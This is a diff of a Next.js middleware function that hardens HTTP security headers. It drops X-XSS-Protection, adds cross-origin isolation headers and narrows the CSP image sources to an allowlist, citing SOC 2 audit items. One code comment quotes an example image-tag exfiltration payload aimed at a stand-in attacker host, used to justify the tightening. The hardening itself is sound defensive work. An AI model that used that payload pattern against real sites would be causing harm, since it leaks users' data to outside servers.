@@ -12,8 +12,10 @@ function applySecurityHeaders(response: NextResponse): NextResponse {
   // Prevent MIME type sniffing
   response.headers.set('X-Content-Type-Options', 'nosniff');
 
-  // Enable XSS protection (legacy browsers)
-  response.headers.set('X-XSS-Protection', '1; mode=block');
+  // X-XSS-Protection intentionally NOT set — the header is legacy, ignored
+  // by modern browsers (Chrome removed support in 78), and can actually
+  // INTRODUCE XSS vectors in old IE/Edge through buggy reflective-filter
+  // implementations. CSP is the modern defense (audit L1).
 
   // Strict Transport Security (HSTS) — enforce HTTPS, 1 year
   response.headers.set(
@@ -30,16 +32,40 @@ function applySecurityHeaders(response: NextResponse): NextResponse {
     'camera=(), microphone=(), geolocation=(), payment=()'
   );
 
+  // SOC 2 CC6.6 — cross-origin isolation headers (audit M2).
+  // COOP=same-origin closes window.opener attacks. CORP=same-origin blocks
+  // cross-origin <img>/<script>/<link> embeds. COEP=require-corp is NOT set
+  // because it breaks Supabase storage signed-URL image loads — revisit
+  // when storage URLs are served from a CORP-tagged endpoint.
+  response.headers.set('Cross-Origin-Opener-Policy', 'same-origin');
+  response.headers.set('Cross-Origin-Resource-Policy', 'same-origin');
+
   // Content Security Policy — restrict content sources
   // .trim() prevents trailing newlines from env vars breaking Edge Runtime headers
   const supabaseUrl = (process.env.NEXT_PUBLIC_SUPABASE_URL || '').trim();
+
+  // SOC 2 C1.1 — img-src tightened from `https:` (any HTTPS image) to a
+  // specific allowlist (audit L3). The prior `https:` permitted any HTTPS
+  // image, which could be abused as a data-exfiltration channel via
+  // <img src="https://attacker.com/?stolen=...">. Allowlist covers our
+  // CDN, Supabase storage, and Mercury/Stripe (logos in receipts).
+  const imgSrcAllowlist = [
+    "'self'",
+    'data:',
+    'blob:',
+    'https://cdn.moderntax.io',
+    supabaseUrl,
+    'https://*.supabase.co',
+    'https://files.stripe.com',
+    'https://b.stripecdn.com',
+  ].filter(Boolean).join(' ');
 
   const cspDirectives = [
     "default-src 'self'",
     "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
     "style-src 'self' 'unsafe-inline'",
     `connect-src 'self' ${supabaseUrl} https://*.supabase.co wss://*.supabase.co`,
-    "img-src 'self' data: blob: https:",
+    `img-src ${imgSrcAllowlist}`,
     "font-src 'self' data:",
     "object-src 'none'",
     "worker-src 'self' blob:",
